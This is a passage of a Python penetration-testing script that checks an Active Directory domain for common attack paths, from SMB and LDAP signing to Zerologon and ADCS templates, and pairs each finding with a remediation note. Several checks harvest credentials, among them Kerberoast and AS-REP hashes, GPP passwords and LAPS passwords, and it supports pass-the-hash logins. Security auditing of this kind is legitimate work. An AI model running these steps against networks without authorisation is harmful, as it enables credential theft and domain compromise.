#!/usr/bin/env python3
"""
AD Attack Path Checker
Checks for common AD attack paths and generates an HTML evidence report.

Usage:
  python3 ad_attack_checker.py -dc 10.5.0.10 -u user -p pass -d domain.com
  python3 ad_attack_checker.py -dc 10.5.0.10 -u user -H <NT hash> -d domain.com
  python3 ad_attack_checker.py -dc 10.5.0.10 -u user -p pass -d domain.com -s 10.5.0.0/24 -o ./loot
"""

import subprocess
import argparse
import os
import re
import sys
import socket
import datetime
from pathlib import Path

# ── Colours ───────────────────────────────────────────────────────────────────
R    = "\033[91m"
G    = "\033[92m"
Y    = "\033[93m"
B    = "\033[94m"
C    = "\033[96m"
W    = "\033[97m"
BOLD = "\033[1m"
RST  = "\033[0m"

BANNER = f"""
{R}{BOLD}
  █████╗ ██████╗      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
 ██╔══██╗██╔══██╗    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
 ███████║██║  ██║    ███████║   ██║      ██║   ███████║██║     █████╔╝
 ██╔══██║██║  ██║    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗
 ██║  ██║██████╔╝    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
 ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{RST}{C} AD Attack Path Checker 
"""

# Wordlist search paths for kerbrute / user enum
WORDLIST_PATHS = [
    "/usr/share/wordlists/rockyou.txt",
    "/opt/wordlists/rockyou.txt",
    "/home/kali/wordlists/rockyou.txt",
    "/root/wordlists/rockyou.txt",
    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt",
]

results = []  # Global results store


# ── Helpers ───────────────────────────────────────────────────────────────────

def banner():
    print(BANNER)


def log(msg, level="info"):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    icons = {
        "info": f"{B}[*]{RST}",
        "good": f"{G}[+]{RST}",
        "bad":  f"{R}[-]{RST}",
        "warn": f"{Y}[!]{RST}",
    }
    print(f"  {icons.get(level, '[*]')} [{ts}] {msg}")


def section(title):
    print(f"\n{BOLD}{C}{'─'*60}{RST}")
    print(f"{BOLD}{C}  {title}{RST}")
    print(f"{BOLD}{C}{'─'*60}{RST}")


def run(cmd, timeout=30):
    """Run a shell command, return stdout+stderr."""
    try:
        proc = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=timeout
        )
        return proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"


def tool_exists(tool):
    return subprocess.run(
        f"which {tool}", shell=True, capture_output=True
    ).returncode == 0


def check_port(host, port, timeout=3):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def find_wordlist():
    """Return the first rockyou.txt found, or None."""
    for p in WORDLIST_PATHS:
        if os.path.exists(p):
            return p
    return None



def nxc_cred(username, password, nt_hash=""):
    """Build NXC credential flags — supports password or NT hash (PtH)."""
    if nt_hash:
        return f"-u '{username}' -H '{nt_hash}'"
    return f"-u '{username}' -p '{password}'"


def imp_target(domain, username, password, nt_hash=""):
    """Build impacket target string — supports password or NT hash."""
    if nt_hash:
        return f"'{domain}/{username}' -hashes :{nt_hash}"
    return f"'{domain}/{username}:{password}'"


def certipy_cred(username, domain, password, nt_hash=""):
    """Build certipy credential flags — supports password or NT hash."""
    if nt_hash:
        return f"-u '{username}@{domain}' -hashes :{nt_hash}"
    return f"-u '{username}@{domain}' -p '{password}'"


def store(check, status, evidence, recommendation=""):
    results.append({
        "check": check,
        "status": status,
        "evidence": evidence,
        "recommendation": recommendation,
    })


# ── Checks ────────────────────────────────────────────────────────────────────

def check_smb_signing(dc_ip, username, password, domain, nh=""):
    section("1. SMB Signing")
    log("Checking SMB signing on DC...")
    out = run(f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}'", timeout=30)
    log(f"Raw output:\n{out}", "info")
    if "signing:True" in out or "signing:Required" in out:
        log("SMB Signing ENFORCED", "bad")
        store("SMB Signing", "ENFORCED",
              out.strip(), "SMB signing blocks relay. Look for HTTP coercion paths.")
    else:
        log("SMB Signing NOT ENFORCED — relay possible", "good")
        store("SMB Signing", "VULNERABLE — Not required",
              out.strip(),
              "Enable 'Microsoft network server: Digitally sign communications (always)' via GPO.")


def check_ldap_signing(dc_ip, username, password, domain, nh=""):
    section("2. LDAP Signing & Channel Binding")
    log("Checking LDAP signing and channel binding...")
    out = run(f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}'", timeout=30)
    log(f"Raw output:\n{out}", "info")
    if "signing:None" in out or "channel binding:Never" in out:
        log("LDAP signing NOT enforced — LDAP relay possible", "good")
        store("LDAP Signing", "VULNERABLE — signing:None + channel binding:Never",
              out.strip(),
              "Set GPO: 'Domain controller: LDAP server signing requirements = Require signing'. "
              "Enable channel binding: 'Domain controller: LDAP server channel binding token requirements = Always'.")
    else:
        log("LDAP signing enforced", "bad")
        store("LDAP Signing", "ENFORCED", out.strip())


def check_llmnr_nbtns(dc_ip, username, password, domain, nh=""):
    """
    FIX: wcc takes NO -o options. Previously the script passed
    -o PATH=... KEY=EnableMulticast which caused 'unrecognized arguments'.
    Just call -M wcc directly and parse the output.
    """
    section("3. LLMNR / NBT-NS (wcc)")
    log("Running wcc module to check LLMNR / NBT-NS settings...")
    out = run(f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M wcc", timeout=45)
    log(f"Raw output:\n{out}", "info")

    llmnr_disabled = bool(re.search(r"LLMNR.*(?:Disabled|False|0)", out, re.IGNORECASE))
    nbtns_disabled = bool(re.search(r"NBT.NS.*(?:Disabled|False|0)", out, re.IGNORECASE))

    if llmnr_disabled and nbtns_disabled:
        log("LLMNR and NBT-NS both disabled", "bad")
        store("LLMNR / NBT-NS", "HARDENED — Both disabled", out.strip())
    elif not llmnr_disabled or not nbtns_disabled:
        log("LLMNR or NBT-NS may be enabled — responder target", "good")
        store("LLMNR / NBT-NS", "POTENTIALLY VULNERABLE — check wcc output",
              out.strip(),
              "Disable LLMNR via GPO: Computer Configuration → Policies → Admin Templates → "
              "Network → DNS Client → Turn off multicast name resolution = Enabled. "
              "Disable NBT-NS per-adapter or via registry: HKLM\\SYSTEM\\CurrentControlSet\\"
              "Services\\NetBT\\Parameters\\Interfaces.")
    else:
        store("LLMNR / NBT-NS", "UNKNOWN — wcc gave no result; check manually", out.strip())


def check_maq(dc_ip, username, password, domain, nh=""):
    section("4. MachineAccountQuota")
    log("Checking MachineAccountQuota...")
    out = run(f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M maq", timeout=30)
    log(f"Raw output:\n{out}", "info")
    m = re.search(r"MachineAccountQuota:\s*(\d+)", out, re.IGNORECASE)
    if m:
        maq = int(m.group(1))
        if maq == 0:
            log("MAQ=0 — hardened", "bad")
            store("MachineAccountQuota", "HARDENED", out.strip(), "MAQ=0 is correct.")
        else:
            log(f"MAQ={maq} — any user can add machines", "good")
            store("MachineAccountQuota", f"VULNERABLE — MAQ={maq}",
                  out.strip(),
                  "Set ms-DS-MachineAccountQuota to 0 via ADSI Edit or PowerShell: "
                  "Set-ADDomain -Identity <domain> -Replace @{'ms-DS-MachineAccountQuota'=0}.")
    else:
        store("MachineAccountQuota", "UNKNOWN", out.strip())


def check_nopac(dc_ip, username, password, domain, nh=""):
    section("5. noPac CVE-2021-42278/42287")
    log("Checking noPac...")
    out = run(f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M nopac", timeout=60)
    log(f"Raw output:\n{out}", "info")
    sizes = re.findall(r"PAC size (\d+)", out)
    if len(sizes) == 2 and sizes[0] == sizes[1]:
        log(f"noPac VULNERABLE — PAC sizes match ({sizes[0]})", "good")
        store("noPac CVE-2021-42278/42287", "VULNERABLE",
              out.strip(), "Apply KB5008380 and KB5008102. Set MAQ=0.")
    elif len(sizes) == 2 and sizes[0] != sizes[1]:
        log("noPac — Not vulnerable (PAC sizes differ)", "bad")
        store("noPac CVE-2021-42278/42287", "NOT VULNERABLE", out.strip())
    elif "Cannot exploit" in out or "MachineAccountQuota 0" in out:
        log("noPac blocked — MAQ=0", "bad")
        store("noPac CVE-2021-42278/42287", "NOT VULNERABLE — MAQ=0", out.strip())
    else:
        log("Could not determine noPac status", "warn")
        store("noPac CVE-2021-42278/42287", "UNKNOWN", out.strip())


def check_pre_win2000(dc_ip, username, password, domain, nh=""):
    section("6. Pre-Windows 2000 Compatible Access")
    log("Checking for pre-Win2000 accounts...")
    out = run(f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M pre2k", timeout=30)
    log(f"Raw output:\n{out}", "info")
    if "Found" in out and "pre2k" in out.lower():
        store("Pre-Win2000 Accounts", "FOUND", out.strip(),
              "Pre-Win2000 accounts have a predictable password (lowercase computer name). "
              "Remove from 'Pre-Windows 2000 Compatible Access' group.")
    else:
        store("Pre-Win2000 Accounts", "NOT FOUND", out.strip())


def check_coercion(dc_ip, username, password, domain, nh=""):
    section("7. Coercion Vulnerabilities (coerce_plus)")
    log("Running coerce_plus module...")
    out = run(f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M coerce_plus", timeout=90)
    log(f"Raw output:\n{out}", "info")
    vulns = re.findall(r"VULNERABLE,\s*(\S+)", out)
    if vulns:
        log(f"Coercion VULNERABLE: {', '.join(vulns)}", "good")
        store("Coercion (coerce_plus)", f"VULNERABLE ({', '.join(vulns)})",
              out.strip(),
              "Disable EFS/Print Spooler/DFS on DCs. Enable EPA on ADCS.")
    else:
        log("No coercion vulnerabilities found", "bad")
        store("Coercion (coerce_plus)", "NOT VULNERABLE", out.strip())


def check_webdav(dc_ip, username, password, domain, subnet, nh=""):
    section("8. WebClient / WebDAV")
    target = subnet if subnet else dc_ip
    log(f"Checking WebClient service on {target}...")
    out = run(f"nxc smb {target} {nxc_cred(username, password, nh)} -d '{domain}' -M webdav", timeout=120)
    log(f"Raw output:\n{out}", "info")
    if "RUNNING" in out.upper() or re.search(r"WebClient.*True", out, re.IGNORECASE):
        log("WebClient running — HTTP coercion possible!", "good")
        store("WebClient Service", "FOUND",
              out.strip(), "Disable WebClient service via GPO where not required.")
    else:
        log("No WebClient service found", "bad")
        store("WebClient Service", "NOT FOUND", out.strip())


def check_spooler(dc_ip, username, password, domain, nh=""):
    section("9. Print Spooler")
    log("Checking Print Spooler service on DC...")
    out = run(f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M spooler", timeout=30)
    log(f"Raw output:\n{out}", "info")
    if "RUNNING" in out.upper():
        log("Print Spooler RUNNING on DC — PrinterBug coercion possible", "good")
        store("Print Spooler", "RUNNING — Coercion possible",
              out.strip(), "Disable Print Spooler on all DCs.")
    else:
        log("Print Spooler not running on DC", "bad")
        store("Print Spooler", "NOT RUNNING", out.strip())


def check_ldaps(dc_ip):
    section("10. LDAPS Port 636")
    log(f"Checking port 636 on {dc_ip}...")
    if check_port(dc_ip, 636):
        log("Port 636 OPEN — LDAPS available (shadow credentials prerequisite)", "good")
        store("LDAPS Port 636", "OPEN",
              f"Port 636 open on {dc_ip}",
              "Ensure EPA is enforced on LDAPS.")
    else:
        log("Port 636 closed", "bad")
        store("LDAPS Port 636", "CLOSED", f"Port 636 closed on {dc_ip}")


def check_adcs(dc_ip, username, password, domain, nh=""):
    section("11. ADCS")
    log("Enumerating ADCS via NXC...")
    out_nxc = run(f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M adcs", timeout=45)
    log(f"NXC ADCS output:\n{out_nxc}", "info")

    if "Found PKI" in out_nxc or "Found CN" in out_nxc:
        log("ADCS found", "good")
        store("ADCS Discovery", "FOUND", out_nxc.strip())
    else:
        log("No ADCS found", "bad")
        store("ADCS Discovery", "NOT FOUND", out_nxc.strip())

    # Certipy vulnerable template scan
    certipy_bin = None
    for b in ("certipy-ad", "certipy"):
        if tool_exists(b):
            certipy_bin = b
            break

    if certipy_bin:
        log(f"Running {certipy_bin} vulnerable template check...")
        out_c = run(
            f"{certipy_bin} find {certipy_cred(username, domain, password, nh)} "
            f"-dc-ip {dc_ip} -vulnerable -stdout",
            timeout=120,
        )
        log(f"Certipy output:\n{out_c}", "info")
        if "ESC" in out_c and "Enabled" in out_c:
            escs = re.findall(r"(ESC\d+)", out_c)
            unique = list(dict.fromkeys(escs))
            log(f"Vulnerable templates found: {', '.join(unique)}", "good")
            store("ADCS Templates", f"VULNERABLE ({', '.join(unique)})",
                  out_c.strip(),
                  "Review and restrict vulnerable certificate templates. "
                  "Disable enrollee-supplied subject where not required.")
        else:
            log("No vulnerable ADCS templates found", "bad")
            store("ADCS Templates", "NOT FOUND", out_c.strip())

        # ESC8 — HTTP relay to ADCS web enrollment
        log("Checking ESC8 (ADCS HTTP enrollment + EPA)...")
        out_esc8 = run(
            f"{certipy_bin} find {certipy_cred(username, domain, password, nh)} "
            f"-dc-ip {dc_ip} -stdout",
            timeout=120,
        )
        if "Web Enrollment" in out_esc8:
            if "Enforce Encryption for Requests: Enabled" in out_esc8 or "EPA" in out_esc8:
                store("ADCS ESC8", "BLOCKED — EPA ENFORCED", out_esc8.strip(), "EPA is correct.")
            else:
                store("ADCS ESC8", "VULNERABLE — Web enrollment without EPA",
                      out_esc8.strip(),
                      "Enable EPA on IIS for CertSrv and /certenroll endpoints.")
        else:
            store("ADCS ESC8", "NOT FOUND — Web enrollment not detected", out_esc8.strip())
    else:
        log("certipy-ad not found — skipping template enumeration", "warn")
        store("ADCS Templates", "SKIPPED — certipy-ad not installed",
              "Install: pip install certipy-ad")
        store("ADCS ESC8", "SKIPPED — certipy-ad not installed", "")


def check_kerberoast(dc_ip, username, password, domain, nh=""):
    section("12. Kerberoasting")
    log("Checking for Kerberoastable accounts...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' --kerberoasting /tmp/kerberoast.txt",
        timeout=60,
    )
    log(f"Raw output:\n{out}", "info")
    if "$krb5tgs$" in out or os.path.exists("/tmp/kerberoast.txt"):
        hashes = open("/tmp/kerberoast.txt").read() if os.path.exists("/tmp/kerberoast.txt") else ""
        count = hashes.count("$krb5tgs$")
        log(f"Kerberoastable accounts found: {count}", "good")
        store("Kerberoasting", f"VULNERABLE — {count} account(s)",
              out.strip() + "\n\n" + hashes[:2000],
              "Use strong, unique service account passwords (25+ chars). "
              "Enable AES encryption on service accounts. Audit SPNs.")
    else:
        log("No Kerberoastable accounts found", "bad")
        store("Kerberoasting", "NOT VULNERABLE", out.strip())


def check_asreproast(dc_ip, username, password, domain, nh=""):
    section("13. AS-REP Roasting")
    log("Checking for AS-REP Roastable accounts...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' --asreproast /tmp/asrep.txt",
        timeout=60,
    )
    log(f"Raw output:\n{out}", "info")
    if "$krb5asrep$" in out or os.path.exists("/tmp/asrep.txt"):
        hashes = open("/tmp/asrep.txt").read() if os.path.exists("/tmp/asrep.txt") else ""
        count = hashes.count("$krb5asrep$")
        log(f"AS-REP Roastable accounts found: {count}", "good")
        store("AS-REP Roasting", f"VULNERABLE — {count} account(s)",
              out.strip() + "\n\n" + hashes[:2000],
              "Enable Kerberos pre-authentication on all accounts where possible.")
    else:
        log("No AS-REP Roastable accounts found", "bad")
        store("AS-REP Roasting", "NOT VULNERABLE", out.strip())


def check_user_enum(dc_ip, domain, nh=""):
    """
    FIX: Find rockyou.txt across multiple common paths before calling kerbrute.
    If no wordlist found, skip gracefully rather than failing.
    """
    section("14. User Enumeration (No Creds)")
    wordlist = find_wordlist()
    if not tool_exists("kerbrute"):
        log("kerbrute not found — skipping user enum", "warn")
        store("User Enum (No Creds)", "SKIPPED — kerbrute not installed", "")
        return

    if not wordlist:
        log(f"No wordlist found (checked: {', '.join(WORDLIST_PATHS)})", "warn")
        store("User Enum (No Creds)", "SKIPPED — wordlist not found",
              f"Checked paths: {', '.join(WORDLIST_PATHS)}\n"
              "Provide a wordlist at one of these paths or pass --wordlist.")
        return

    log(f"Running kerbrute userenum with {wordlist}...")
    out = run(
        f"kerbrute userenum --dc {dc_ip} -d {domain} {wordlist} --threads 20",
        timeout=300,
    )
    log(f"Raw output:\n{out}", "info")
    valid = re.findall(r"VALID USERNAME:\s*(\S+)", out)
    if valid:
        log(f"Valid usernames found: {len(valid)}", "good")
        store("User Enum (No Creds)", f"FOUND — {len(valid)} valid user(s)",
              out.strip(),
              "Monitor KDC enumeration. Disable pre-auth only when required.")
    else:
        store("User Enum (No Creds)", "NOT FOUND", out.strip())


def check_duplicate_spns(dc_ip, username, password, domain, nh=""):
    """
    FIX: GetUserSPNs.py -dupes flag does not exist in impacket.
    Use LDAP query to pull all SPNs, then detect duplicates in Python.
    """
    section("15. Duplicate SPNs")
    log("Querying SPNs via LDAP...")
    out = run(
        f"GetUserSPNs.py {imp_target(domain, username, password, nh)} -dc-ip {dc_ip}",
        timeout=45,
    )
    log(f"Raw output:\n{out}", "info")

    # Parse SPNs from output and detect duplicates
    spn_to_accounts = {}
    for line in out.splitlines():
        m = re.match(r"\s*([\w\-/\.@]+)\s+([\w\-$]+)\s*$", line)
        if m:
            spn, account = m.group(1).strip(), m.group(2).strip()
            spn_to_accounts.setdefault(spn, []).append(account)

    dupes = {s: a for s, a in spn_to_accounts.items() if len(a) > 1}
    if dupes:
        detail = "\n".join(f"  {s}: {', '.join(a)}" for s, a in dupes.items())
        log(f"Duplicate SPNs found: {len(dupes)}", "good")
        store("Duplicate SPNs", f"FOUND — {len(dupes)} duplicate(s)",
              out.strip() + "\n\nDuplicates:\n" + detail,
              "Each SPN must map to exactly one account. "
              "Use setspn -X to audit and remove duplicates.")
    else:
        log("No duplicate SPNs found", "bad")
        store("Duplicate SPNs", "NOT FOUND", out.strip())


def check_krbtgt_age(dc_ip, username, password, domain, nh=""):
    section("16. krbtgt Password Age")
    log("Checking krbtgt password last set...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(sAMAccountName=krbtgt)' 'pwdLastSet'",
        timeout=30,
    )
    log(f"Raw output:\n{out}", "info")
    m = re.search(r"pwdLastSet.*?(\d{4}-\d{2}-\d{2})", out)
    if m:
        try:
            age = (datetime.datetime.now() - datetime.datetime.strptime(m.group(1), "%Y-%m-%d")).days
            if age > 180:
                log(f"krbtgt password age: {age} days — too old", "good")
                store("krbtgt Password Age", f"STALE — {age} days old",
                      out.strip(),
                      "Rotate krbtgt password twice (to invalidate existing tickets). "
                      "Target rotation every 180 days.")
            else:
                log(f"krbtgt password age: {age} days — acceptable", "bad")
                store("krbtgt Password Age", f"OK — {age} days old", out.strip())
        except Exception:
            store("krbtgt Password Age", "UNKNOWN", out.strip())
    else:
        store("krbtgt Password Age", "UNKNOWN", out.strip())


def check_zerologon(dc_ip, username, password, domain, nh=""):
    section("17. Zerologon CVE-2020-1472")
    log("Checking Zerologon...")
    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M zerologon",
        timeout=45,
    )
    log(f"Raw output:\n{out}", "info")
    if "VULNERABLE" in out.upper():
        log("Zerologon VULNERABLE", "good")
        store("Zerologon CVE-2020-1472", "VULNERABLE",
              out.strip(), "Apply KB4557222 immediately. Enforce secure channel on all DCs.")
    else:
        log("Zerologon — Not vulnerable", "bad")
        store("Zerologon CVE-2020-1472", "NOT VULNERABLE", out.strip())


def check_eternalblue(dc_ip, username, password, nh=""):
    section("18. EternalBlue MS17-010")
    log("Checking MS17-010...")
    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -M ms17-010",
        timeout=30,
    )
    log(f"Raw output:\n{out}", "info")
    if "VULNERABLE" in out.upper():
        store("EternalBlue MS17-010", "VULNERABLE",
              out.strip(), "Apply MS17-010 security update. Disable SMBv1.")
    else:
        store("EternalBlue MS17-010", "NOT VULNERABLE", out.strip())


def check_exchange(dc_ip, username, password, domain, nh=""):
    """
    FIX: -M exchange module removed from NXC.
    Detect Exchange via LDAP objectClass=msExchExchangeServer query instead.
    """
    section("19. Exchange Detection")
    log("Querying LDAP for Exchange server objects...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(objectClass=msExchExchangeServer)' 'name cn'",
        timeout=30,
    )
    log(f"Raw output:\n{out}", "info")

    # Also check for Exchange SM_ health mailbox accounts (strong indicator)
    out2 = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(cn=Microsoft Exchange System Objects)' 'name'",
        timeout=30,
    )

    if ("name" in out and "entries found" not in out.lower() and "[+]" in out) or \
       "Microsoft Exchange System Objects" in out2:
        log("Exchange detected in AD", "good")
        store("Exchange Detected", "FOUND",
              out.strip() + "\n\n" + out2.strip(),
              "Verify ProxyLogon/ProxyShell patching. Check domain object WriteDACL for Exchange server accounts.")
    else:
        log("No Exchange objects found", "bad")
        store("Exchange Detected", "NOT FOUND", out.strip())


def check_privexchange(dc_ip, username, password, domain, nh=""):
    """
    FIX: -M privexchange module removed from NXC.
    Check Exchange server computer account for WriteDACL on domain root instead.
    """
    section("20. PrivExchange / Exchange DACL")
    log("Checking Exchange server accounts for WriteDACL on domain root...")
    # Get Exchange server computer accounts
    out_accounts = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(objectClass=msExchExchangeServer)' 'cn sAMAccountName'",
        timeout=30,
    )
    # Check DACL on domain root for Exchange servers using daclread
    domain_dn = "DC=" + domain.replace(".", ",DC=")
    out_dacl = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M daclread -o TARGET_DN='{domain_dn}' ACTION=read",
        timeout=45,
    )
    log(f"Exchange accounts:\n{out_accounts}", "info")
    log(f"DACL read:\n{out_dacl}", "info")

    if "WriteDacl" in out_dacl or "GenericAll" in out_dacl:
        store("PrivExchange / Exchange DACL", "POTENTIALLY VULNERABLE — WriteDACL found on domain root",
              out_accounts.strip() + "\n\n" + out_dacl.strip(),
              "Remove Exchange server WriteDACL from domain root object. "
              "Apply latest Exchange CUs. Review ExchangeWindows Permissions group ACLs.")
    elif not out_accounts.strip() or "No entries" in out_accounts:
        store("PrivExchange / Exchange DACL", "NOT APPLICABLE — No Exchange servers found",
              out_accounts.strip())
    else:
        store("PrivExchange / Exchange DACL", "NOT FOUND — No suspicious DACLs on domain root",
              out_dacl.strip())


def check_delegation(dc_ip, username, password, domain, nh=""):
    section("21. Delegation")

    # Unconstrained
    log("Checking unconstrained delegation...")
    out_unc = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--trusted-for-delegation",
        timeout=30,
    )
    log(f"Unconstrained output:\n{out_unc}", "info")
    if "entries found" in out_unc.lower() and "0 entries" not in out_unc.lower() and \
       "[-] No entries" not in out_unc:
        store("Unconstrained Delegation", "FOUND",
              out_unc.strip(),
              "Remove unconstrained delegation from all non-DC accounts. "
              "Use constrained delegation or RBCD instead.")
    else:
        store("Unconstrained Delegation", "NOT FOUND", out_unc.strip())

    # Constrained — via impacket
    log("Checking constrained delegation...")
    out_con = run(
        f"findDelegation.py {imp_target(domain, username, password, nh)} -dc-ip {dc_ip}",
        timeout=30,
    )
    log(f"Constrained output:\n{out_con}", "info")
    if "CONSTRAINED" in out_con.upper() or ("AccountName" in out_con and "No entries" not in out_con):
        store("Constrained Delegation", "FOUND",
              out_con.strip(),
              "Audit constrained delegation targets. Prefer RBCD over classic KCD.")
    else:
        store("Constrained Delegation", "NOT FOUND", out_con.strip())


def check_password_policy(dc_ip, username, password, domain, nh=""):
    """
    FIX: Increased timeout from 30 to 90s. Password policy checks
    against busy DCs were consistently timing out.
    """
    section("22. Password Policy")
    log("Retrieving domain password policy...")
    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' --pass-pol",
        timeout=90,
    )
    log(f"Raw output:\n{out}", "info")
    if "Minimum password length" in out or "Pass" in out:
        min_len = re.search(r"Minimum password length:\s*(\d+)", out)
        lockout  = re.search(r"Account lockout threshold:\s*(\d+)", out)
        ml = int(min_len.group(1)) if min_len else None
        lo = int(lockout.group(1)) if lockout else None
        weak = (ml is not None and ml < 12) or (lo is not None and lo == 0)
        status = "WEAK POLICY" if weak else "RETRIEVED"
        store("Password Policy", status, out.strip(),
              "Min 12+ chars, complexity enabled, lockout after 5 attempts.")
    elif "TIMEOUT" in out:
        log("Password policy check timed out — try manually: nxc smb -M pass_pol", "warn")
        store("Password Policy", "TIMEOUT", out.strip(),
              "Run manually: nxc smb <dc> -u user -p pass --pass-pol")
    else:
        store("Password Policy", "RETRIEVED", out.strip(),
              "Min 12+ chars, complexity enabled, lockout after 5 attempts.")


def check_fgpp(dc_ip, username, password, domain, nh=""):
    section("23. Fine-Grained Password Policies")
    log("Checking for Fine-Grained Password Policies...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(objectClass=msDS-PasswordSettings)' 'cn msDS-MinimumPasswordLength msDS-LockoutThreshold'",
        timeout=30,
    )
    log(f"Raw output:\n{out}", "info")
    if "cn" in out and "[+]" in out:
        store("Fine-Grained Password Policies", "FOUND", out.strip(),
              "Review FGPP targets — privileged accounts should have stricter policies.")
    else:
        store("Fine-Grained Password Policies", "NOT FOUND", out.strip())


def check_gpp_passwords(dc_ip, username, password, domain, nh=""):
    """FIX: Increased timeout from 30 to 90s — GPP checks against remote SYSVOL were timing out."""
    section("24. GPP Passwords")
    log("Checking SYSVOL for GPP passwords...")
    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M gpp_password",
        timeout=90,
    )
    log(f"Raw output:\n{out}", "info")
    if "password" in out.lower() and "[+]" in out:
        log("GPP Password found!", "good")
        store("GPP Passwords", "FOUND",
              out.strip(),
              "Remove all cpassword values from SYSVOL GPP XML files. "
              "Use LAPS for local admin password management.")
    elif "TIMEOUT" in out:
        log("GPP password check timed out", "warn")
        store("GPP Passwords", "TIMEOUT — check manually", out.strip())
    else:
        store("GPP Passwords", "NOT FOUND", out.strip())


def check_gpp_autologin(dc_ip, username, password, domain, nh=""):
    """FIX: Increased timeout from 30 to 90s."""
    section("25. GPP Autologin")
    log("Checking GPP autologin entries...")
    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M gpp_autologin",
        timeout=90,
    )
    log(f"Raw output:\n{out}", "info")
    if "[+]" in out and ("Username" in out or "Password" in out):
        log("GPP Autologin credentials found!", "good")
        store("GPP Autologin", "FOUND",
              out.strip(),
              "Remove autologin credentials from Group Policy. Rotate any exposed credentials.")
    elif "TIMEOUT" in out:
        store("GPP Autologin", "TIMEOUT — check manually", out.strip())
    else:
        store("GPP Autologin", "NOT FOUND", out.strip())


def check_laps(dc_ip, username, password, domain, nh=""):
    section("26. LAPS")
    log("Checking LAPS deployment and readability...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M laps",
        timeout=30,
    )
    log(f"Raw output:\n{out}", "info")
    if "ms-MCS-AdmPwd" in out or "msLAPS-Password" in out:
        log("LAPS passwords READABLE!", "good")
        store("LAPS", "READABLE — LAPS passwords accessible",
              out.strip(),
              "Restrict ms-MCS-AdmPwd / msLAPS-Password read access to authorised groups only.")
    elif "Getting LAPS" in out:
        store("LAPS", "DEPLOYED — NOT READABLE", out.strip())
    else:
        store("LAPS", "NOT DEPLOYED or NOT FOUND", out.strip(),
              "Deploy LAPS to manage local administrator passwords.")


def check_passwords_in_descriptions(dc_ip, username, password, domain, nh=""):
    section("27. Passwords in User Descriptions")
    log("Scanning user description fields for credentials...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M get-desc-users",
        timeout=45,
    )
    log(f"Raw output:\n{out}", "info")
    keywords = ["pass", "pwd", "password", "cred", "secret", "key"]
    matches = [l for l in out.splitlines()
               if any(k in l.lower() for k in keywords) and "description" in l.lower()]
    if matches or ("Found following users" in out and "[+]" in out):
        store("Passwords in Descriptions", "FOUND",
              out.strip(),
              "Audit and clear sensitive data from AD user description fields.")
    else:
        store("Passwords in Descriptions", "NOT FOUND", out.strip())


def check_cleartext_ldap_passwords(dc_ip, username, password, domain, nh=""):
    section("28. Cleartext LDAP Passwords")
    log("Checking for cleartext userPassword / unixUserPassword attributes...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M get-unixUserPassword",
        timeout=30,
    )
    out2 = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M get-userPassword",
        timeout=30,
    )
    combined = out.strip() + "\n" + out2.strip()
    if "[+]" in combined and "password" in combined.lower():
        store("Cleartext LDAP Passwords", "FOUND",
              combined, "Audit and remove cleartext passwords from LDAP attributes.")
    else:
        store("Cleartext LDAP Passwords", "NOT FOUND", combined)


def check_password_not_required(dc_ip, username, password, domain, nh=""):
    section("29. Password Not Required Flag")
    log("Checking for accounts with PASSWD_NOTREQD flag...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))' "
        f"'sAMAccountName userAccountControl'",
        timeout=30,
    )
    log(f"Raw output:\n{out}", "info")
    if "[+]" in out and "sAMAccountName" in out:
